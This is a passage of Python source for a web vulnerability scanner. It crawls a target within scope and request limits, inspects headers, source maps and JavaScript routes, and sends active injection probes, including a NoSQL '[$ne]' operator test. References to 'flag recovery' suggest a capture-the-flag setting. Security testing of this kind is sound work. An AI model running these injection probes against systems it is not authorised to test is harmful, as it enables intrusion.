        if finding.parameter not in {key for key, _ in params}:
            return None
        if any(k.lower() in finding.parameter.lower() for k in
               ("password", "token", "secret", "session", "csrf")):
            return None
        marker = "WCS_NONMATCH_7340"
        normal_url = self._set_query(finding.url, finding.parameter, marker)
        parts = urlsplit(finding.url)
        operator_query = [(k, v) for k, v in params if k != finding.parameter]
        operator_query.append((finding.parameter + "[$ne]", marker))
        operator_url = urlunsplit((
            parts.scheme, parts.netloc, parts.path, urlencode(operator_query), "",
        ))
        baseline_a = self._request(normal_url)
        baseline_b = self._request(normal_url)
        tested_a = self._request(operator_url)
        tested_b = self._request(operator_url)
        # Echoing a marker or its encoded form is not evidence of query
        # operator handling and makes response comparison misleading.
        outputs = (baseline_a, baseline_b, tested_a, tested_b)
        if any(marker in result.text or quote_plus(marker) in result.text
               for result in outputs):
            return None
        def signature(response: Response) -> tuple[int, str]:
            return (response.status,
                    sha256(response.text.encode("utf-8", "replace")).hexdigest())
        left = signature(baseline_a)
        right = signature(tested_a)
        if (left != signature(baseline_b)
                or right != signature(tested_b) or left == right):
            return None
        return self._finding(
            rule="WEB-NOSQL-REVIEW-001",
            title="GET bracket-operator response differential",
            severity="info", confidence="low", url=finding.url,
            parameter=finding.parameter, method="GET",
            evidence="Repeated scalar and [$ne] query variants produced stable "
                     "different responses; input validation may explain the result.",
            vector=f"Compare GET {redact_url(finding.url)} with scalar and bracketed parameter variants.",
            patch="Use typed input validation; reject unexpected object operators.",
            flag_path="Manual validation is required; this is not a confirmed NoSQL injection.",
        )

    def _comment_hint_finding(self, response: Response, keywords: set[str]) -> Finding:
        """Classify observed comment indicators without retaining comment text."""
        return self._finding(
            rule="WEB-COMMENT-HINT-001",
            title="Source comment contains review keywords",
            severity="info", confidence="medium", url=response.url,
            evidence="Comment keyword categories: " + ", ".join(sorted(keywords)) +
                     "; comment content omitted; no sensitive data exposure proven.",
            vector=f"Review comments manually in GET {redact_url(response.url)}.",
            patch="Remove sensitive implementation notes from public HTML/JavaScript assets.",
        )

    def _js_comment_hints(self, response: Response) -> list[Finding]:
        """Scan bounded JavaScript comment syntax without executing scripts."""
        if response.status != 200:
            return []
        comments = _js_comments(response.text[:MAX_BODY])
        keywords = set()
        for comment in comments[:100]:
            keywords.update(_comment_keywords(comment))
        return [self._comment_hint_finding(response, keywords)] if keywords else []

    def _metadata_findings(self, response: Response, method: str) -> list[Finding]:
        """Summarize metadata headers without disclosing server banner values."""
        items = []
        allowed = response.headers.get("allow", "")
        if allowed:
            standard = {"GET", "HEAD", "OPTIONS", "POST", "PUT", "PATCH",
                        "DELETE", "TRACE", "CONNECT"}
            names = sorted(set(allowed.upper().replace(" ", "").split(",")) & standard)
            if names:
                items.append(self._finding(
                    rule="WEB-HTTP-ALLOW-001",
                    title="HTTP methods advertised by server",
                    severity="info", confidence="high", url=response.url,
                    method=method,
                    evidence="Allow header advertises methods: " + ", ".join(names) +
                             "; availability does not imply authorization.",
                    vector=f"Inspect {method} response headers for {redact_url(response.url)}.",
                    patch="Restrict HTTP methods to those required by the application.",
                ))
        banners = [name for name in ("server", "x-powered-by")
                   if name in response.headers]
        if banners:
            items.append(self._finding(
                rule="WEB-TECH-BANNER-001", title="Technology banner header present",
                severity="info", confidence="medium", url=response.url, method=method,
                evidence="Technology banner header names: " + ", ".join(banners) +
                         "; header values are omitted.",
                vector=f"Inspect {method} response headers for {redact_url(response.url)}.",
                patch="Avoid exposing unnecessary technology and version details.",
            ))
        return items

    def _source_map_hints(self, response: Response) -> list[Finding]:
        """Record same-origin JavaScript source-map references without fetching them."""
        if response.status != 200:
            return []
        # Source maps are annotations, not proof that the map is accessible.
        # Keep the map URL out of reports because it could carry query secrets.
        hints = re.findall(
            r"(?://[#@]\s*sourceMappingURL\s*=\s*([^\s*]+)|/\*#\s*sourceMappingURL\s*=\s*([^*\s]+))",
            response.text,
            re.I,
        )
        for line_hint, block_hint in hints:
            candidate = line_hint or block_hint
            if not candidate or candidate.startswith(("data:", "//", "\\\\")):
                continue
            try:
                url = urljoin(response.url, candidate)
                parsed = urlsplit(url)
                if (parsed.scheme not in {"http", "https"} or not self._in_scope(url)
                        or parsed.username or parsed.password):
                    continue
            except ValueError:
                continue
            return [self._finding(
                rule="WEB-SOURCEMAP-HINT-001",
                title="JavaScript source-map annotation observed",
                severity="info", confidence="medium", url=response.url,
                evidence="A JavaScript sourceMappingURL references a same-origin map; "
                         "availability and source disclosure have not been tested.",
                vector=f"Review the sourceMappingURL annotation in GET {redact_url(response.url)}.",
                patch="Do not publish sensitive source maps or embedded credentials in production assets.",
            )]
        return []

    @staticmethod
    def _static_get_routes(source: str) -> list[str]:
        """Find literal GET routes in scripts without evaluating JavaScript.

        Dynamic expressions, POST requests and template strings are excluded.
        These are discovery hints, not evidence of vulnerabilities.
        """
        patterns = (
            r"""\bfetch\s*\(\s*['"]([^'"]+)['"]\s*\)""",
            r"""\bfetch\s*\(\s*['"]([^'"]+)['"]\s*,\s*\{\s*method\s*:\s*['"]GET['"]\s*\}\s*\)""",
            r"""\baxios\.get\s*\(\s*['"]([^'"]+)['"]""",
            r"""\$\.(?:get|getJSON)\s*\(\s*['"]([^'"]+)['"]""",
            r"""\$\.ajax\s*\(\s*\{\s*url\s*:\s*['"]([^'"]+)['"]\s*,\s*(?:method|type)\s*:\s*['"]GET['"]""",
            r"""\baxios\s*\(\s*\{\s*method\s*:\s*['"]GET['"]\s*,\s*url\s*:\s*['"]([^'"]+)['"]""",
            r"""\b(?:window\.)?open\s*\(\s*['"]GET['"]\s*,\s*['"]([^'"]+)['"]""",
        )
        routes: set[str] = set()
        for pattern in patterns:
            for found in re.findall(pattern, source, re.I):
                if found.startswith(("/", "./", "../", "http://", "https://")) and not any(
                    marker in found for marker in ("{", "}", "${", "\\")
                ):
                    routes.add(found)
        return sorted(routes)

    @staticmethod
    def _static_api_hints(source: str) -> list[tuple[str, str]]:
        """Catalog literal API route hints; do not enqueue non-GET methods."""
        source = source[:MAX_BODY]
        routes: set[tuple[str, str]] = set()
        for method, path in re.findall(
            r"""\baxios\.(post|put|patch|delete)\s*\(\s*['"]([^'"]+)['"]""",
            source, re.I,
        ):
            routes.add((method.upper(), path))
        for path, method in re.findall(
            r"""\bfetch\s*\(\s*['"]([^'"]+)['"]\s*,\s*\{\s*method\s*:\s*['"](POST|PUT|PATCH|DELETE)['"]""",
            source, re.I,
        ):
            routes.add((method.upper(), path))
        for path, method in re.findall(
            r"""\$\.ajax\s*\(\s*\{\s*url\s*:\s*['"]([^'"]+)['"]\s*,\s*(?:method|type)\s*:\s*['"](POST|PUT|PATCH|DELETE)['"]""",
            source, re.I,
        ):
            routes.add((method.upper(), path))
        # Accept both key orders in bounded, flat axios/jQuery config objects.
        # Only annotate methods; these hints never become active requests.
        configs = re.findall(
            r"""(?:\baxios(?:\.request)?|\$\.ajax)\s*\(\s*\{([^{}]{1,320})\}""",
            source, re.I,
        )
        for options in configs[:100]:
            method = re.search(
                r"""(?:^|,)\s*(?:method|type)\s*:\s*['"](POST|PUT|PATCH|DELETE)['"]""",
                options, re.I,
            )
            url = re.search(
                r"""(?:^|,)\s*url\s*:\s*['"]([^'"]{1,256})['"]\s*(?=,|$)""",
                options, re.I,
            )
            if method and url:
                routes.add((method.group(1).upper(), url.group(1)))
        # fetch() may include flat options before its method declaration.
        for path, options in re.findall(
            r"""\bfetch\s*\(\s*['"]([^'"]{1,256})['"]\s*,\s*\{([^{}]{1,320})\}""",
            source, re.I,
        )[:100]:
            method = re.search(
                r"""(?:^|,)\s*method\s*:\s*['"](POST|PUT|PATCH|DELETE)['"]""",
                options, re.I,
            )
            if method:
                routes.add((method.group(1).upper(), path))
        for path in re.findall(
            r"""['"](/(?:api|v[1-9]\d*|admin|internal)/[^'"\s]{0,160})['"]""",
            source, re.I | re.A,
        ):
            if not any(found == path for _, found in routes):
                routes.add(("UNKNOWN", path))
        return sorted((method, path) for method, path in routes
                      if (path.startswith(("/", "./", "../", "http://", "https://"))
                          and not path.startswith("//")
                          and not any(ch in path for ch in ("{", "}", "\\", "\r", "\n"))))[:20]

    def _js_api_findings(self, response: Response) -> list[Finding]:
        if response.status != 200:
            return []
        out = []
        for method, path in self._static_api_hints(response.text):
            try:
                absolute = urljoin(response.url, path)
                parsed = urlsplit(absolute)
                if (not self._in_scope(absolute) or parsed.username or parsed.password
                        or parsed.scheme not in {"http", "https"}):
                    continue
            except ValueError:
                continue
            out.append(self._finding(
                rule="WEB-JS-API-HINT-001",
                title="Static JavaScript API route hint",
                severity="info", confidence="low", url=absolute,
                method=method, evidence=(f"Literal {method} API route annotation; "
                                         "reachability and authorization have not been checked."),
                vector=f"Review the source in GET {redact_url(response.url)}; no request was sent to this route.",
                patch="Apply server-side authorization and input validation on every API route.",
            ))
        return out

    def _collect_metadata(self, report: ScanReport) -> None:
        for method in ("HEAD", "OPTIONS"):
            if self.requests_sent >= self.max_requests:
                break
            try:
                metadata = self._request(self.target, method)
                report.findings.extend(self._posture_findings(metadata, method))
                report.findings.extend(self._metadata_findings(metadata, method))
            except (OSError, RuntimeError, ValueError):
                report.errors.append(f"{method} metadata request failed")

    def _script_routes(self, response: Response, parser: PageParser,
                       report: ScanReport) -> list:
        # Examine inline scripts and bounded same-origin JavaScript files for
        # literal GET routes. Never execute JavaScript or issue inferred POSTs.
        routes = []
        routes.extend(self._static_get_routes(response.text))
        for script in parser.scripts[:10]:
            script_url = self._clean_url(urljoin(response.url, script))
            if not self._in_scope(script_url) or self.requests_sent >= self.max_requests:
                continue
            try:
                js = self._request(script_url)
                if len(js.text) <= MAX_BODY and js.status == 200:
                    routes.extend(self._static_get_routes(js.text))
                    report.findings.extend(self._source_map_hints(js))
                    report.findings.extend(self._js_comment_hints(js))
                    report.findings.extend(self._js_api_findings(js))
            except (OSError, RuntimeError, ValueError):
                continue
        return routes

    def _enqueue_routes(self, response: Response, routes: list, seen: set[str], queue: deque) -> None:
        for href in routes:
            try:
                nxt = self._clean_url(urljoin(response.url, href))
                parsed_nxt = urlsplit(nxt)
                if parsed_nxt.scheme not in {"http", "https"}:
                    continue
                if self._in_scope(nxt) and nxt not in seen and nxt not in queue:
                    queue.append(nxt)
            except ValueError:
                continue

    def _crawl(self, report: ScanReport) -> tuple[int, list[Finding], int]:
        queue = deque(dict.fromkeys((self.target, *self.inventory_urls)))
        seen: set[str] = set()
        successful_pages = 0
        candidates: list[Finding] = []
        discovered_routes = 0
        while queue and len(seen) < self.max_pages and self.requests_sent < self.max_requests:
            url = queue.popleft()
            if url in seen:
                continue
            seen.add(url)
            try:
                response = self._request(url)
            except (OSError, RuntimeError, ValueError):
                report.errors.append(f"{redact_url(url)}: request failed")
                continue
            successful_pages += 1
            parser = PageParser()
            ctype = response.headers.get("content-type", "")
            is_html = "html" in ctype or HTML_MARKER in response.text[:500].lower()
            if is_html:
                parser.feed(response.text)
            self.observations[response.url] = self._observe(response, parser)
            items = self._posture_findings(response) + self._passive_findings(response, parser)
            report.findings.extend(items)
            candidates.extend(item for item in items if item.rule in {"WEB-SQLI-001", "WEB-SSTI-001", "WEB-CMDI-001", "WEB-FILE-001", "WEB-REDIR-001", "WEB-XSS-001"})
            routes = list(parser.links)
            if is_html:
                routes.extend(self._script_routes(response, parser, report))
            discovered_routes += len(routes)
            self._enqueue_routes(response, routes, seen, queue)
        return successful_pages, candidates, discovered_routes

    def _run_active_probes(self, report: ScanReport, candidates: list[Finding]) -> None:
        probe_priority = {
            "WEB-CMDI-001": 0,
            "WEB-SSTI-001": 1,
            "WEB-SQLI-001": 2,
            "WEB-FILE-001": 3,
            "WEB-REDIR-001": 4,
            "WEB-XSS-001": 5,
        }
        for finding in sorted(candidates, key=lambda item: (
                probe_priority.get(item.rule, 9), item.url, item.parameter, item.id)):
            if self.requests_sent + 2 > self.max_requests:
                break
            try:
                confirmed = self._active_probe(finding)
                if confirmed:
                    report.findings.append(confirmed)
            except (OSError, RuntimeError, ValueError):
                report.errors.append(f"active {redact_url(finding.url)}#{finding.parameter}: request failed")

    def _run_nosql_reviews(self, report: ScanReport, candidates: list[Finding]) -> None:
        reviewed: set[tuple[str, str]] = set()
        for finding in candidates:
            if finding.method != "GET" or finding.rule != "WEB-SQLI-001":
                continue
            key = (finding.url, finding.parameter)
            if key in reviewed:
                continue
            reviewed.add(key)
            if len(reviewed) > 3 or self.requests_sent + 4 > self.max_requests:
                break
            try:
                review = self._nosql_query_review(finding)
                if review:
                    report.findings.append(review)
            except (OSError, RuntimeError, ValueError):
                report.errors.append(
                    f"noSQL review {redact_url(finding.url)}: request failed")

    def scan(self) -> ScanReport:
        report = ScanReport(self.target, self.active, profiles=(self.profile,),
                            session_source=self.session.source if self.session else "none")
        self._collect_metadata(report)
        successful_pages, candidates, discovered_routes = self._crawl(report)
        if self.active:
            self._run_active_probes(report, candidates)
        if self.inventory_urls:
            report.coverage.append(
                f"Seeded {len(self.inventory_urls)} GET endpoint(s) from a redacted inventory; "
                "all requests remain subject to normal scan budgets."
            )
        if self.active and self.nosql_query:
            self._run_nosql_reviews(report, candidates)
        if discovered_routes == 0 and not self.inventory_urls:
            report.coverage.append(
                "No navigable links, GET form actions or literal script GET routes were discovered. "
                "This HTTP-only scanner cannot execute JavaScript or observe live XHR/fetch traffic."
            )
        if not candidates:
            report.coverage.append(
                "No eligible query or form parameters were found for active injection probes; "
                "zero findings does not establish that the application is secure."
            )
        unique = {item.id: item for item in report.findings}
        severity = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        report.findings = sorted(unique.values(), key=lambda f: (severity.get(f.severity, 9), f.url, f.rule, f.parameter, f.id))
        report.pages_scanned = successful_pages
        report.requests_sent = self.requests_sent
        return report


def scan_profiles(target: str, *, profiles: tuple[str, ...] = ("desktop", "mobile"),
                  active: bool = False, max_pages: int = 20, timeout: float = 5.0,
                  max_requests: int = 80, verify_tls: bool = True,
                  sessions: dict[str, BrowserSession] | None = None,
                  proxy: str | None = None,
                  inventory_urls: tuple[str, ...] = (),
                  ssti_alternates: bool = False,
                  nosql_query: bool = False) -> ScanReport:
    """Run isolated profile scans and combine results in stable order."""
    if not profiles or any(profile not in PROFILES for profile in profiles):
        raise ValueError("profiles must contain desktop and/or mobile")
    reports: list[ScanReport] = []
    scanners: dict[str, Scanner] = {}
    for profile in profiles:
        scanner = Scanner(target, active=active, max_pages=max_pages, timeout=timeout,
                          max_requests=max_requests, verify_tls=verify_tls, profile=profile,
                          session=(sessions or {}).get(profile), proxy=proxy,
                          inventory_urls=inventory_urls,
                          ssti_alternates=ssti_alternates,
                          nosql_query=nosql_query)
        scanners[profile] = scanner
        reports.append(scanner.scan())
    combined = ScanReport(
        target=reports[0].target,
        active=active,
        pages_scanned=sum(report.pages_scanned for report in reports),
        requests_sent=sum(report.requests_sent for report in reports),
        findings=[finding for report in reports for finding in report.findings],
        errors=[f"{profile}: {error}" for profile, report in zip(profiles, reports, strict=False) for error in report.errors],
        coverage=[f"{profile}: {note}" for profile, report in zip(profiles, reports, strict=False) for note in report.coverage],
        profiles=profiles,
        session_source=next((report.session_source for report in reports if report.session_source != "none"), "none"),
    )
    if len(profiles) == 2:
        combined.findings.extend(_profile_differences(scanners[profiles[0]], scanners[profiles[1]], reports))
    severity = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    unique = {finding.id: finding for finding in combined.findings}
    combined.findings = sorted(unique.values(), key=lambda finding: (
        severity.get(finding.severity, 9), finding.url, finding.rule,
        finding.profile, finding.parameter, finding.id,
    ))
    return combined


def _observation_differences(first: Scanner, second: Scanner, url: str) -> list[str]:
    left = first.observations.get(url)
    right = second.observations.get(url)
    if left is None or right is None:
        return [f"page visible only to {first.profile if right is None else second.profile}"]
    differences: list[str] = []
    if left.status != right.status:
        differences.append(f"status {first.profile}={left.status}, {second.profile}={right.status}")
    if (left.body_length, left.body_sha256) != (right.body_length, right.body_sha256):
        differences.append(
            f"body {first.profile}=len:{left.body_length},sha256:{left.body_sha256[:12]}; "
            f"{second.profile}=len:{right.body_length},sha256:{right.body_sha256[:12]}"
        )
    if left.forms != right.forms:
        differences.append(f"form signatures differ ({len(left.forms)} vs {len(right.forms)})")
    if left.parameters != right.parameters:
        differences.append(
            f"parameters {first.profile}={list(left.parameters)}, {second.profile}={list(right.parameters)}"
        )
    return differences


def _profile_difference_finding(first: Scanner, second: Scanner, url: str,
                                differences: list[str]) -> Finding:
    return Finding(
        rule="WEB-PROFILE-DIFF-001",
        title="Desktop/mobile response surface differs",
        severity="info",
        confidence="high",
        url=url,
        profile="comparison",
        evidence="; ".join(differences),
        vector=(
            f"Repeat GET {redact_url(url)} with Sec-CH-UA-Mobile {PROFILES[first.profile]['Sec-CH-UA-Mobile']} "
            f"and {PROFILES[second.profile]['Sec-CH-UA-Mobile']}; inspect profile-tagged candidates."
        ),
        patch="Apply the same authentication, authorization, validation, and output encoding to every device-specific route.",
        flag_path="A device-specific surface may expose a distinct route or input. Validate its profile-tagged findings before flag recovery.",
    )


def _profile_differences(first: Scanner, second: Scanner,
                         reports: list[ScanReport]) -> list[Finding]:
    out: list[Finding] = []
    first_findings = {(item.url, item.rule, item.parameter) for item in reports[0].findings}
    second_findings = {(item.url, item.rule, item.parameter) for item in reports[1].findings}
    finding_difference = first_findings != second_findings
    urls = sorted(set(first.observations) | set(second.observations))
    for url in urls:
        differences = _observation_differences(first, second, url)
        left_rules = sorted((rule, parameter) for finding_url, rule, parameter in first_findings if finding_url == url)
        right_rules = sorted((rule, parameter) for finding_url, rule, parameter in second_findings if finding_url == url)
        if left_rules != right_rules:
            differences.append(f"finding keys {first.profile}={left_rules}, {second.profile}={right_rules}")
        if url == first.target and finding_difference:
            left_only = sorted(first_findings - second_findings)[:8]
            right_only = sorted(second_findings - first_findings)[:8]
            differences.append(
                f"profile-only findings {first.profile}={left_only}, {second.profile}={right_only}"
            )
        if differences:
            out.append(_profile_difference_finding(first, second, url, differences))
    return out
